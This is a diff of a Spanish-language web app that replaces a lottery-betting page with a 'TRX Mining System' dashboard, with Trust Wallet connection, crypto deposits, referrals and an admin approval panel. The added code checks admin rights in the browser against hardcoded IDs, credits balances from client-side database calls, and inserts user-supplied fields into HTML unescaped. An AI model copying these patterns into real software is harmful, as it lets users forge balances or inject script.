+                        <li class="transaction-item">
+                            <div class="transaction-desc">No hay ganancias por referidos aún</div>
+                            <div class="transaction-amount">0 TRX</div>
+                        </li>
+                    </ul>
                 </div>
             </div>
-            <div class="modal-footer">
-                <button class="modal-btn cancel" id="cancelWithdraw">Cancelar</button>
-                <button class="modal-btn confirm" id="confirmWithdraw">Solicitar Retiro</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="modal-overlay" id="loginModal">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Iniciar Sesión</h3>
-                <button class="close-modal" id="closeLoginModal">&times;</button>
-            </div>
-            <div class="modal-body">
-                <form class="auth-form" id="loginForm">
+            
+            <!-- Sección de Soporte -->
+            <div class="tab-content hidden" id="support-tab">
+                <div class="card">
+                    <h2 class="card-title">Soporte Técnico</h2>
+                    <p>¿Tienes problemas con la plataforma? Contacta a nuestro equipo de soporte.</p>
+                    
                     <div class="form-group">
-                        <label for="loginEmail">Correo Electrónico</label>
-                        <input type="email" id="loginEmail" required placeholder="tucorreo@ejemplo.com">
-                        <div class="error-message" id="loginEmailError"></div>
+                        <label for="support-subject">Asunto</label>
+                        <input type="text" id="support-subject" placeholder="Asunto de tu consulta">
                     </div>
+                    
                     <div class="form-group">
-                        <label for="loginPassword">Contraseña</label>
-                        <input type="password" id="loginPassword" required placeholder="Tu contraseña">
-                        <div class="error-message" id="loginPasswordError"></div>
+                        <label for="support-message">Mensaje</label>
+                        <textarea id="support-message" rows="5" placeholder="Describe tu problema o consulta"></textarea>
                     </div>
-                    <button type="submit" class="modal-btn confirm" id="loginSubmitBtn">
-                        <span id="loginBtnText">Iniciar Sesión</span>
-                        <span id="loginLoading" class="loading" style="display: none;"></span>
-                    </button>
-                </form>
-                <div class="auth-form-footer">
-                    <p>¿No tienes cuenta? <a id="switchToSignup">Regístrate aquí</a></p>
-                    <p><a id="forgotPassword">¿Olvidaste tu contraseña?</a></p>
+                    
+                    <div class="button-group">
+                        <button id="send-support" class="btn-success">Enviar Mensaje</button>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h2 class="card-title">Tickets de Soporte</h2>
+                    <div id="support-tickets">
+                        <p>No tienes tickets de soporte abiertos.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Sección de Administración (solo para admin) -->
+            <div id="admin-section" class="admin-section hidden">
+                <h2 class="admin-title">Panel de Administración</h2>
+                
+                <div class="card">
+                    <h2 class="card-title">Depósitos Pendientes de Aprobación</h2>
+                    <div class="pending-deposits" id="pending-deposits">
+                        <p>No hay depósitos pendientes de aprobación.</p>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h2 class="card-title">Retiros Pendientes de Aprobación</h2>
+                    <div id="pending-withdrawals">
+                        <p>No hay retiros pendientes de aprobación.</p>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
-
-    <div class="modal-overlay" id="signupModal">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Registrarse</h3>
-                <button class="close-modal" id="closeSignupModal">&times;</button>
-            </div>
-            <div class="modal-body">
-                <form class="auth-form" id="signupForm">
-                    <div class="form-group">
-                        <label for="signupName">Nombre Completo</label>
-                        <input type="text" id="signupName" required placeholder="Tu nombre completo">
-                        <div class="error-message" id="signupNameError"></div>
-                    </div>
-                    <div class="form-group">
-                        <label for="signupEmail">Correo Electrónico</label>
-                        <input type="email" id="signupEmail" required placeholder="tucorreo@ejemplo.com">
-                        <div class="error-message" id="signupEmailError"></div>
-                    </div>
-                    <div class="form-group">
-                        <label for="signupPassword">Contraseña (mínimo 6 caracteres)</label>
-                        <input type="password" id="signupPassword" required minlength="6" placeholder="Crea una contraseña">
-                        <div class="error-message" id="signupPasswordError"></div>
-                    </div>
-                    <div class="form-group">
-                        <label for="signupConfirmPassword">Confirmar Contraseña</label>
-                        <input type="password" id="signupConfirmPassword" required placeholder="Repite tu contraseña">
-                        <div class="error-message" id="signupConfirmPasswordError"></div>
-                    </div>
-                    <button type="submit" class="modal-btn confirm" id="signupSubmitBtn">
-                        <span id="signupBtnText">Registrarse</span>
-                        <span id="signupLoading" class="loading" style="display: none;"></span>
-                    </button>
-                </form>
-                <div class="auth-form-footer">
-                    <p>¿Ya tienes cuenta? <a id="switchToLogin">Inicia sesión aquí</a></p>
-                </div>
-            </div>
+    
+    <footer>
+        <div class="container">
+            <p>TRX Mining System 2025 - Plataforma de Minería Virtual</p>
+            <p>Este es un sistema con integración de Trust Wallet y aprobación administrativa.</p>
         </div>
-    </div>
-
-    <div class="modal-overlay" id="resetPasswordModal">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Recuperar Contraseña</h3>
-                <button class="close-modal" id="closeResetModal">&times;</button>
-            </div>
-            <div class="modal-body">
-                <form class="auth-form" id="resetPasswordForm">
-                    <div class="form-group">
-                        <label for="resetEmail">Correo Electrónico</label>
-                        <input type="email" id="resetEmail" required placeholder="tucorreo@ejemplo.com">
-                        <div class="error-message" id="resetEmailError"></div>
-                    </div>
-                    <button type="submit" class="modal-btn confirm" id="resetSubmitBtn">
-                        <span id="resetBtnText">Enviar Enlace</span>
-                        <span id="resetLoading" class="loading" style="display: none;"></span>
-                    </button>
-                </form>
-                <div class="auth-form-footer">
-                    <p><a id="backToLogin">Volver a inicio de sesión</a></p>
-                </div>
-            </div>
-        </div>
-    </div>
+    </footer>
 
     <script>
+        // Configuración de Firebase
         const firebaseConfig = {
-            apiKey: "AIzaSyCvsbltMThiL7XE4NEkVCXIs802NDGByTA",
-            authDomain: "gane-loteria.firebaseapp.com",
-            databaseURL: "https://gane-loteria-default-rtdb.firebaseio.com/",
-            projectId: "gane-loteria",
-            storageBucket: "gane-loteria.firebasestorage.app",
-            messagingSenderId: "475760396000",
-            appId: "1:475760396000:web:2788cc2fc3c7cc3ceab285",
-            measurementId: "G-Y6FD2H5YF5"
+            apiKey: "AIzaSyDiIz3QpI1rYEyMYP512tdKM7pkzWFSFKg",
+            authDomain: "mina-trx.firebaseapp.com",
+            databaseURL: "https://mina-trx-default-rtdb.firebaseio.com/",
+            projectId: "mina-trx",
+            storageBucket: "mina-trx.firebasestorage.app",
+            messagingSenderId: "592300655333",
+            appId: "1:592300655333:web:a5fff60b36c9a880114a0c",
+            measurementId: "G-GREBM8YM08"
         };
-
+        
+        // Inicializar Firebase
         firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
         const auth = firebase.auth();
-
-        let userBalance = 0;
-        let selectedDayNumbers = [];
-        let selectedNightNumbers = [];
-        let lastResults = [];
-        let userBets = [];
+        const db = firebase.firestore();
+        
+        // Variables globales
         let currentUser = null;
-        let lastWithdrawalDate = null;
-        let cancelDayBetTimer = null;
-        let cancelNightBetTimer = null;
-        let cancelDayBetTimeout = null;
-        let cancelNightBetTimeout = null;
-        let currentDayBetId = null;
-        let currentNightBetId = null;
-        let numberLimits = {};
-        let isGameEnabled = true;
-        let userIP = null;
-        let betTypeDay = 'fijo'; // 'fijo' o 'corrido'
-        let betTypeNight = 'fijo'; // 'fijo' o 'corrido'
-
-        function escapeHtml(unsafe) {
-            if (typeof unsafe !== 'string') return unsafe;
-            return unsafe
-                .replace(/&/g, "&amp;")
-                .replace(/</g, "&lt;")
-                .replace(/>/g, "&gt;")
-                .replace(/"/g, "&quot;")
-                .replace(/'/g, "&#039;");
-        }
-
-        async function getUserIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('Error al obtener la IP:', error);
-                return null;
-            }
-        }
-
-        function isBettingTime() {
-            const now = new Date();
-            const hours = now.getHours();
-            const minutes = now.getMinutes();
-            return (hours >= 0 && hours < 13) || (hours >= 14 && hours < 21);
-        }
-
-        function isDayBettingTime() {
-            const now = new Date();
-            const hours = now.getHours();
-            return hours >= 0 && hours < 13;
-        }
-
-        function isNightBettingTime() {
-            const now = new Date();
-            const hours = now.getHours();
-            return hours >= 14 && hours < 21;
-        }
-
-        function updateBetButtonTime() {
-            const placeDayBetBtn = document.getElementById('placeDayBetBtn');
-            const placeNightBetBtn = document.getElementById('placeNightBetBtn');
-            const betTimeBanner = document.getElementById('betTimeBanner');
-            
-            if (isBettingTime()) {
-                betTimeBanner.style.display = 'none';
-            } else {
-                betTimeBanner.style.display = 'block';
-                placeDayBetBtn.disabled = true;
-                placeNightBetBtn.disabled = true;
-            }
-            
-            updateBoardAvailability();
-        }
-
-        function updateBoardAvailability() {
-            const dayTab = document.querySelector('.bet-tab[data-tab="day"]');
-            const nightTab = document.querySelector('.bet-tab[data-tab="night"]');
-            const dayContent = document.getElementById('dayBetContent');
-            const nightContent = document.getElementById('nightBetContent');
-            
-            document.querySelectorAll('.number-btn').forEach(btn => {
-                btn.classList.add('disabled');
-            });
-            
-            if (isDayBettingTime()) {
-                dayTab.classList.add('active');
-                dayContent.classList.add('active');
-                nightTab.classList.remove('active');
-                nightContent.classList.remove('active');
-                
-                document.querySelectorAll('#dayNumberGrid .number-btn').forEach(btn => {
-                    btn.classList.remove('disabled');
-                });
-            } else if (isNightBettingTime()) {
-                dayTab.classList.remove('active');
-                dayContent.classList.remove('active');
-                nightTab.classList.add('active');
-                nightContent.classList.add('active');
-                
-                document.querySelectorAll('#nightNumberGrid .number-btn').forEach(btn => {
-                    btn.classList.remove('disabled');
-                });
-            }
-        }
-
-        window.showReceipt = function(betId) {
-            const bet = userBets.find(b => b.id === betId);
-            if (!bet) return;
-            
-            let receiptHtml;
-            
-            if (bet.type === 'dice') {
-                receiptHtml = generateDiceReceipt(bet);
-            } else {
-                receiptHtml = generateBetReceipt(bet);
-            }
-            
-            Swal.fire({
-                title: 'Comprobante de Apuesta',
-                html: receiptHtml,
-                confirmButtonColor: '#F4B315',
-                width: '600px',
-                background: '#1A141A',
-                color: '#FFFFFF'
-            });
-        };
-
-        async function initApp() {
-            userIP = await getUserIP();
-            
-            generateNumberGrid('dayNumberGrid', 'day');
-            generateNumberGrid('nightNumberGrid', 'night');
-            setupEventListeners();
-            
-            updateBetButtonTime();
-            updateBoardAvailability();
-            setInterval(updateBetButtonTime, 60000);
-            
-            auth.onAuthStateChanged(user => {
+        let userData = null;
+        let miningInterval = null;
+        let countdownInterval = null;
+        let web3 = null;
+        let isTrustConnected = false;
+        
+        // Referencias a elementos DOM
+        const authSection = document.getElementById('auth-section');
+        const dashboard = document.getElementById('dashboard');
+        const authAlert = document.getElementById('auth-alert');
+        const dashboardAlert = document.getElementById('dashboard-alert');
+        const loginBtn = document.getElementById('login-btn');
+        const registerBtn = document.getElementById('register-btn');
+        const logoutBtn = document.getElementById('logout-btn');
+        const forgotPassword = document.getElementById('forgot-password');
+        const connectTrustBtn = document.getElementById('connect-trust');
+        const trustStatus = document.getElementById('trust-status');
+        const authLoader = document.getElementById('auth-loader');
+        const adminSection = document.getElementById('admin-section');
+        
+        // Inicializar la aplicación
+        function initApp() {
+            // Verificar estado de autenticación
+            auth.onAuthStateChanged((user) => {
                 if (user) {
                     currentUser = user;
-                    showUserInfo();
                     loadUserData();
-                    loadRecentResults();
-                    loadNumberLimits();
-                    checkGameStatus();
-                    loadAnnouncement();
-                    closeAllModals();
+                    showDashboard();
+                    
+                    // Verificar si es administrador
+                    checkIfAdmin(user.uid);
                 } else {
-                    currentUser = null;
-                    showGuestInfo();
+                    showAuth();
                 }
             });
-        }
-
-        function checkGameStatus() {
-            database.ref('gameStatus').on('value', snapshot => {
-                const status = snapshot.val();
-                isGameEnabled = status === undefined || status.enabled !== false;
-                updateGameStatusUI();
-            });
-        }
-
-        function loadAnnouncement() {
-            database.ref('announcement').on('value', snapshot => {
-                const announcement = snapshot.val();
-                const banner = document.getElementById('announcementBanner');
-                const text = document.getElementById('announcementText');
-                
-                if (announcement && announcement.text && announcement.enabled) {
-                    banner.style.display = 'block';
-                    text.innerHTML = announcement.text;
-                } else {
-                    banner.style.display = 'none';
-                }
-            });
-        }
-
-        function updateGameStatusUI() {
-            const betPanel = document.getElementById('betPanel');
-            const globalBanner = document.getElementById('globalDisabledBanner');
             
-            if (isGameEnabled) {
-                betPanel.classList.remove('game-disabled');
-                globalBanner.style.display = 'none';
-                
-                const existingMessages = document.querySelectorAll('.game-disabled-message');
-                existingMessages.forEach(msg => msg.remove());
+            // Configurar event listeners
+            setupEventListeners();
+            
+            // Iniciar el contador de minería
+            startMiningCountdown();
+            
+            // Verificar si MetaMask/Trust Wallet está instalado
+            if (typeof window.ethereum !== 'undefined') {
+                trustStatus.textContent = 'Trust Wallet detectado. Haz clic en conectar.';
             } else {
-                betPanel.classList.add('game-disabled');
-                globalBanner.style.display = 'block';
-                
-                if (!document.querySelector('#betPanel .game-disabled-message')) {
-                    const betMessage = document.createElement('div');
-                    betMessage.className = 'game-disabled-message';
-                    betMessage.textContent = 'Apuestas deshabilitadas temporalmente';
-                    betPanel.appendChild(betMessage);
-                }
+                trustStatus.textContent = 'Trust Wallet no detectado. Por favor instala la extensión.';
+                connectTrustBtn.disabled = true;
             }
         }
-
-        function showUserInfo() {
-            document.getElementById('userInfo').style.display = 'flex';
-            document.getElementById('guestInfo').style.display = 'none';
-            document.getElementById('appContent').style.display = 'grid';
-            document.getElementById('welcomeMessage').style.display = 'none';
-            
-            const userNameDisplay = document.getElementById('userNameDisplay');
-            if (currentUser.displayName) {
-                userNameDisplay.textContent = currentUser.displayName;
-            } else {
-                const email = currentUser.email;
-                userNameDisplay.textContent = email ? email.split('@')[0] : 'Usuario';
-            }
-        }
-
-        function showGuestInfo() {
-            document.getElementById('userInfo').style.display = 'none';
-            document.getElementById('guestInfo').style.display = 'flex';
-            document.getElementById('appContent').style.display = 'none';
-            document.getElementById('welcomeMessage').style.display = 'block';
-        }
-
+        
+        // Configurar event listeners
         function setupEventListeners() {
-            document.getElementById('loginBtn').addEventListener('click', () => openModal('loginModal'));
-            document.getElementById('signupBtn').addEventListener('click', () => openModal('signupModal'));
-            document.getElementById('welcomeLoginBtn').addEventListener('click', () => openModal('loginModal'));
-            document.getElementById('welcomeSignupBtn').addEventListener('click', () => openModal('signupModal'));
-            document.getElementById('logoutBtn').addEventListener('click', logout);
+            // Botones de autenticación
+            loginBtn.addEventListener('click', handleLogin);
+            registerBtn.addEventListener('click', handleRegister);
+            logoutBtn.addEventListener('click', handleLogout);
+            forgotPassword.addEventListener('click', handlePasswordReset);
+            connectTrustBtn.addEventListener('click', connectTrustWallet);
             
-            document.getElementById('depositBtn').addEventListener('click', () => {
-                openModal('depositModal');
-                if (currentUser) {
-                    document.getElementById('userIdDisplay').textContent = currentUser.uid;
+            // Navegación
+            document.querySelectorAll('.nav-item').forEach(item => {
+                if (item.id !== 'logout-btn') {
+                    item.addEventListener('click', switchTab);
                 }
             });
-            document.getElementById('withdrawBtn').addEventListener('click', () => openModal('withdrawModal'));
             
-            document.getElementById('closeDepositModal').addEventListener('click', () => closeModal('depositModal'));
-            document.getElementById('closeWithdrawModal').addEventListener('click', () => closeModal('withdrawModal'));
-            document.getElementById('closeLoginModal').addEventListener('click', () => closeModal('loginModal'));
-            document.getElementById('closeSignupModal').addEventListener('click', () => closeModal('signupModal'));
-            document.getElementById('closeResetModal').addEventListener('click', () => closeModal('resetPasswordModal'));
-            document.getElementById('cancelDeposit').addEventListener('click', () => closeModal('depositModal'));
-            document.getElementById('cancelWithdraw').addEventListener('click', () => closeModal('withdrawModal'));
-            
-            document.getElementById('switchToSignup').addEventListener('click', () => {
-                closeModal('loginModal');
-                openModal('signupModal');
-            });
-            
-            document.getElementById('switchToLogin').addEventListener('click', () => {
-                closeModal('signupModal');
-                openModal('loginModal');
-            });
-            
-            document.getElementById('forgotPassword').addEventListener('click', () => {
-                closeModal('loginModal');
-                openModal('resetPasswordModal');
-            });
-            
-            document.getElementById('backToLogin').addEventListener('click', () => {
-                closeModal('resetPasswordModal');
-                openModal('loginModal');
-            });
-            
-            document.getElementById('loginForm').addEventListener('submit', login);
-            document.getElementById('signupForm').addEventListener('submit', signup);
-            document.getElementById('resetPasswordForm').addEventListener('submit', resetPassword);
-            
-            document.getElementById('depositAmount').addEventListener('input', updateDepositAmountDisplay);
-            document.getElementById('confirmDeposit').addEventListener('click', confirmDeposit);
-            
-            document.getElementById('confirmWithdraw').addEventListener('click', confirmWithdrawal);
-            
-            document.querySelectorAll('.quick-bet').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    const amount = parseInt(btn.dataset.amount);
-                    const target = btn.dataset.target || 'dayBetAmount';
-                    document.getElementById(target).value = amount;
-                    
-                    if (target.includes('day')) {
-                        updateDayBetButton();
-                    } else {
-                        updateNightBetButton();
-                    }
+            // Navegación desde la billetera
+            document.querySelectorAll('.wallet-action-btn').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    const targetTab = e.target.getAttribute('data-target-tab');
+                    switchTabTo(targetTab);
                 });
             });
             
-            document.getElementById('dayBetAmount').addEventListener('input', updateDayBetButton);
-            document.getElementById('placeDayBetBtn').addEventListener('click', () => placeBet('day'));
-            document.getElementById('cancelDayBetBtn').addEventListener('click', () => cancelBet('day'));
+            // Botones de minería
+            document.querySelectorAll('.activate-miner').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    const minerType = e.target.getAttribute('data-miner');
+                    activateMiner(minerType);
+                });
+            });
             
-            document.getElementById('nightBetAmount').addEventListener('input', updateNightBetButton);
-            document.getElementById('placeNightBetBtn').addEventListener('click', () => placeBet('night'));
-            document.getElementById('cancelNightBetBtn').addEventListener('click', () => cancelBet('night'));
+            // Botones de depósito
+            document.getElementById('copy-deposit-address').addEventListener('click', copyDepositAddress);
+            document.getElementById('verify-transaction').addEventListener('click', verifyTransaction);
+            document.getElementById('send-trx-trust').addEventListener('click', sendTRXWithTrustWallet);
             
-            document.querySelectorAll('.bet-type-btn').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    const type = this.dataset.type;
-                    const tab = this.closest('.bet-content').id.includes('day') ? 'day' : 'night';
+            // Botones de retiro
+            document.getElementById('withdraw-btn').addEventListener('click', handleWithdraw);
+            
+            // Botones de referidos
+            document.getElementById('copy-referral-link').addEventListener('click', copyReferralLink);
+            
+            // Botones de soporte
+            document.getElementById('send-support').addEventListener('click', sendSupportTicket);
+        }
+        
+        // Conectar con Trust Wallet
+        async function connectTrustWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    // Solicitar conexión de cuentas
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // Actualizar el tipo de apuesta según el tab
-                    if (tab === 'day') {
-                        betTypeDay = type;
-                    } else {
-                        betTypeNight = type;
+                    // Inicializar Web3
+                    web3 = new Web3(window.ethereum);
+                    
+                    // Obtener la cuenta conectada
+                    const account = accounts[0];
+                    
+                    // Actualizar UI
+                    trustStatus.textContent = 'Conectado: ' + account.substring(0, 10) + '...';
+                    trustStatus.className = 'wallet-status connected';
+                    isTrustConnected = true;
+                    
+                    showAlert(dashboardAlert, 'Trust Wallet conectado correctamente', 'success');
+                } catch (error) {
+                    console.error('Error conectando con Trust Wallet:', error);
+                    showAlert(dashboardAlert, 'Error al conectar Trust Wallet: ' + error.message, 'error');
+                }
+            } else {
+                showAlert(dashboardAlert, 'Trust Wallet no detectado. Por favor instala la extensión.', 'error');
+            }
+        }
+        
+        // Enviar TRX usando Trust Wallet
+        async function sendTRXWithTrustWallet() {
+            if (!isTrustConnected) {
+                showAlert(dashboardAlert, 'Por favor conecta Trust Wallet primero', 'error');
+                return;
+            }
+            
+            const amount = document.getElementById('deposit-amount').value;
+            
+            if (!amount || amount < 10) {
+                showAlert(dashboardAlert, 'Por favor ingresa una cantidad válida (mínimo 10 TRX)', 'error');
+                return;
+            }
+            
+            const depositAddress = document.getElementById('deposit-address').value;
+            
+            try {
+                // Nota: En una implementación real, necesitarías el contrato ABI y dirección
+                // para interactuar con el token TRX en la red de Tron
+                // Esta es una simplificación para demostración
+                
+                showAlert(dashboardAlert, 'Preparando transacción...', 'info');
+                
+                // En una implementación real, aquí iría la lógica para enviar TRX
+                // Como esto es complejo y requiere configuración específica de red,
+                // mostramos un mensaje instructivo
+                
+                showAlert(dashboardAlert, 'Por favor envía los TRX manualmente a la dirección proporcionada y luego ingresa el hash de transacción para verificación.', 'info');
+                
+            } catch (error) {
+                console.error('Error enviando TRX:', error);
+                showAlert(dashboardAlert, 'Error al enviar TRX: ' + error.message, 'error');
+            }
+        }
+        
+        // Verificar si el usuario es administrador
+        function checkIfAdmin(userId) {
+            // En una implementación real, verificarías esto contra tu base de datos
+            // Aquí usamos una lista hardcodeada para demostración
+            const adminUsers = [
+                'admin123', // ID de ejemplo de administrador
+                'administrador' // ID de ejemplo de administrador
+            ];
+            
+            // Comprobar si el usuario actual es admin
+            if (adminUsers.includes(userId) || userData?.isAdmin) {
+                adminSection.classList.remove('hidden');
+                loadPendingDeposits();
+                loadPendingWithdrawals();
+            }
+        }
+        
+        // Cargar depósitos pendientes de aprobación
+        function loadPendingDeposits() {
+            db.collection('pendingDeposits').where('status', '==', 'pending')
+                .get()
+                .then((querySnapshot) => {
+                    const pendingDepositsContainer = document.getElementById('pending-deposits');
+                    
+                    if (querySnapshot.empty) {
+                        pendingDepositsContainer.innerHTML = '<p>No hay depósitos pendientes de aprobación.</p>';
+                        return;
                     }
                     
-                    // Actualizar la interfaz
-                    this.parentElement.querySelectorAll('.bet-type-btn').forEach(b => {
-                        b.classList.remove('selected');
+                    pendingDepositsContainer.innerHTML = '';
+                    
+                    querySnapshot.forEach((doc) => {
+                        const deposit = doc.data();
+                        const depositItem = document.createElement('div');
+                        depositItem.className = 'pending-item';
+                        
+                        depositItem.innerHTML = `
+                            <div class="pending-details">
+                                <strong>Usuario:</strong> ${deposit.userEmail}<br>
+                                <strong>Cantidad:</strong> ${deposit.amount} TRX<br>
+                                <strong>Hash:</strong> ${deposit.txHash}<br>
+                                <strong>Fecha:</strong> ${new Date(deposit.timestamp?.toDate()).toLocaleString()}
+                            </div>
+                            <div class="pending-actions">
+                                <button class="btn-success approve-deposit" data-id="${doc.id}">Aprobar</button>
+                                <button class="btn-danger reject-deposit" data-id="${doc.id}">Rechazar</button>
+                            </div>
+                        `;
+                        
+                        pendingDepositsContainer.appendChild(depositItem);
                     });
-                    this.classList.add('selected');
                     
-                    // Actualizar la información del premio
-                    updatePrizeInfo(tab);
+                    // Agregar event listeners a los botones
+                    document.querySelectorAll('.approve-deposit').forEach(btn => {
+                        btn.addEventListener('click', (e) => {
+                            const depositId = e.target.getAttribute('data-id');
+                            approveDeposit(depositId);
+                        });
+                    });
                     
-                    // Actualizar el botón de apuesta
-                    if (tab === 'day') {
-                        updateDayBetButton();
-                    } else {
-                        updateNightBetButton();
-                    }
+                    document.querySelectorAll('.reject-deposit').forEach(btn => {
+                        btn.addEventListener('click', (e) => {
+                            const depositId = e.target.getAttribute('data-id');
+                            rejectDeposit(depositId);
+                        });
+                    });
+                })
+                .catch((error) => {
+                    console.error('Error cargando depósitos pendientes:', error);
                 });
-            });
-            
-            document.querySelectorAll('.bet-tab').forEach(tab => {
-                tab.addEventListener('click', () => {
-                    const tabType = tab.dataset.tab;
-                    if ((tabType === 'day' && !isDayBettingTime()) || (tabType === 'night' && !isNightBettingTime())) {
-                        showAlert('info', 'Horario de apuestas', `El tablero de ${tabType === 'day' ? 'Medio Día' : 'Noche'} solo está disponible en su horario correspondiente`);
-                        return;
-                    }
-                    
-                    document.querySelectorAll('.bet-tab').forEach(t => t.classList.remove('active'));
-                    document.querySelectorAll('.bet-content').forEach(c => c.classList.remove('active'));
-                    
-                    tab.classList.add('active');
-                    const tabId = tab.dataset.tab;
-                    document.getElementById(`${tabId}BetContent`).classList.add('active');
-                    
-                    // Actualizar la información del premio
-                    updatePrizeInfo(tabId);
-                });
-            });
-            
-            document.getElementById('clearBetsBtn').addEventListener('click', clearUserBets);
-            
-            document.getElementById('facebookBtn').addEventListener('click', () => {
-                window.open('https://www.facebook.com/profile.php?id=61578948227793&mibextid=wwXIfr&mibextid=wwXIfr', '_blank');
-            });
-            
-            document.getElementById('facebookBtnGuest').addEventListener('click', () => {
-                window.open('https://www.facebook.com/profile.php?id=61578948227793&mibextid=wwXIfr&mibextid=wwXIfr', '_blank');
-            });
-            
-            document.getElementById('welcomeFacebookBtn').addEventListener('click', () => {
-                window.open('https://www.facebook.com/profile.php?id=61578948227793&mibextid=wwXIfr&mibextid=wwXIfr', '_blank');
-            });
         }
-
-        function updatePrizeInfo(tab) {
-            const prizeInfo = document.getElementById(`${tab}PrizeInfo`);
-            const betType = tab === 'day' ? betTypeDay : betTypeNight;
-            
-            if (betType === 'fijo') {
-                prizeInfo.innerHTML = 'Premio fijo: 90 CUP por cada CUP apostado';
-            } else {
-                prizeInfo.innerHTML = 'Premio corrido: 25 CUP por cada CUP apostado';
-            }
+        
+        // Cargar retiros pendientes de aprobación
+        function loadPendingWithdrawals() {
+            // Similar a loadPendingDeposits pero para retiros
+            // Implementación simplificada para este ejemplo
         }
-
-        function openModal(modalId) {
-            document.getElementById(modalId).classList.add('active');
-        }
-
-        function closeModal(modalId) {
-            document.getElementById(modalId).classList.remove('active');
-        }
-
-        function closeAllModals() {
-            document.querySelectorAll('.modal-overlay').forEach(modal => {
-                modal.classList.remove('active');
-            });
-        }
-
-        function updateDepositAmountDisplay() {
-            const amount = document.getElementById('depositAmount').value || '0';
-            document.getElementById('depositAmountDisplay').textContent = amount;
-        }
-
-        function generateNumberGrid(gridId, type) {
-            const numberGrid = document.getElementById(gridId);
-            numberGrid.innerHTML = '';
-            
-            for (let i = 0; i < 100; i++) {
-                const numberBtn = document.createElement('button');
-                numberBtn.className = 'number-btn disabled';
-                numberBtn.textContent = i.toString().padStart(2, '0');
-                numberBtn.dataset.number = i;
-                
-                numberBtn.addEventListener('click', () => {
-                    if (!isGameEnabled) {
-                        showAlert('warning', 'Juego deshabilitado', 'Las apuestas están temporalmente deshabilitadas por el administrador');
-                        return;
-                    }
-                    
-                    if ((type === 'day' && !isDayBettingTime()) || (type === 'night' && !isNightBettingTime())) {
-                        showAlert('warning', 'Fuera de horario', `El tablero de ${type === 'day' ? 'Medio Día' : 'Noche'} solo está disponible en su horario correspondiente`);
-                        return;
-                    }
-                    
-                    const number = parseInt(numberBtn.dataset.number);
-                    
-                    if (numberBtn.classList.contains('selected')) {
-                        numberBtn.classList.remove('selected');
-                        if (type === 'day') {
-                            selectedDayNumbers = selectedDayNumbers.filter(n => n !== number);
-                        } else {
-                            selectedNightNumbers = selectedNightNumbers.filter(n => n !== number);
-                        }
-                    } else {
-                        const betAmountInput = type === 'day' ? document.getElementById('dayBetAmount') : document.getElementById('nightBetAmount');
-                        const betAmount = parseFloat(betAmountInput.value) || 0;
-                        const currentLimit = numberLimits[number] || 0;
-                        const remainingLimit = 50 - currentLimit;
+        
+        // Aprobar depósito
+        function approveDeposit(depositId) {
+            db.collection('pendingDeposits').doc(depositId).get()
+                .then((doc) => {
+                    if (doc.exists) {
+                        const deposit = doc.data();
                         
-                        if (betAmount > remainingLimit) {
-                            showAlert('warning', 'Límite de apuesta', `Solo puedes apostar ${remainingLimit} CUP más en el número ${number.toString().padStart(2, '0')}`);
-                            return;
-                        }
+                        // Actualizar el estado del depósito
+                        db.collection('pendingDeposits').doc(depositId).update({
+                            status: 'approved',
+                            approvedAt: new Date(),
+                            approvedBy: currentUser.uid
+                        });
                         
-                        numberBtn.classList.add('selected');
-                        if (type === 'day') {
-                            selectedDayNumbers.push(number);
-                        } else {
-                            selectedNightNumbers.push(number);
-                        }
+                        // Acreditar fondos al usuario
+                        db.collection('users').doc(deposit.userId).update({
+                            balance: firebase.firestore.FieldValue.increment(deposit.amount),
+                            totalDeposited: firebase.firestore.FieldValue.increment(deposit.amount),
+                            transactions: firebase.firestore.FieldValue.arrayUnion({
+                                type: 'deposit',
+                                amount: deposit.amount,
+                                description: `Depósito aprobado - Hash: ${deposit.txHash}`,
+                                timestamp: new Date(),
+                                status: 'completed'
+                            })
+                        });
+                        
+                        // Recargar la lista de depósitos pendientes
+                        loadPendingDeposits();
+                        
+                        showAlert(dashboardAlert, 'Depósito aprobado correctamente', 'success');
                     }
-                    
-                    if (type === 'day') {
-                        updateDayBetButton();
-                    } else {
-                        updateNightBetButton();
-                    }
+                })
+                .catch((error) => {
+                    console.error('Error aprobando depósito:', error);
+                    showAlert(dashboardAlert, 'Error al aprobar el depósito', 'error');
                 });
-                
-                numberGrid.appendChild(numberBtn);
-            }
         }
-
-        function updateDayBetButton() {
-            const betAmountInput = document.getElementById('dayBetAmount');
-            let betAmount = parseFloat(betAmountInput.value) || 0;
+        
+        // Rechazar depósito
+        function rejectDeposit(depositId) {
+            const reason = prompt('Ingresa el motivo del rechazo:');
             
-            if (betAmount > 50) {
-                betAmount = 50;
-                betAmountInput.value = 50;
-                showAlert('warning', 'Límite excedido', 'El máximo permitido por número es 50 CUP');
-            }
+            if (reason === null) return;
             
-            const placeBetBtn = document.getElementById('placeDayBetBtn');
-            const totalBetAmount = betAmount * selectedDayNumbers.length;
-            
-            let canBet = true;
-            let limitInfo = '';
-            
-            selectedDayNumbers.forEach(number => {
-                const currentLimit = numberLimits[number] || 0;
-                const remainingLimit = 50 - currentLimit;
-                
-                if (betAmount > remainingLimit) {
-                    canBet = false;
-                    limitInfo = `El número ${number.toString().padStart(2, '0')} solo puede recibir ${remainingLimit} CUP más (ya tiene ${currentLimit} CUP apostados)`;
-                }
-            });
-            
-            if (selectedDayNumbers.length > 0 && betAmount > 0) {
-                if (totalBetAmount <= userBalance && canBet && isDayBettingTime() && isGameEnabled) {
-                    placeBetBtn.disabled = false;
-                    document.getElementById('dayNumberLimitInfo').textContent = `Puedes apostar hasta ${50 - betAmount} CUP más por número`;
-                } else {
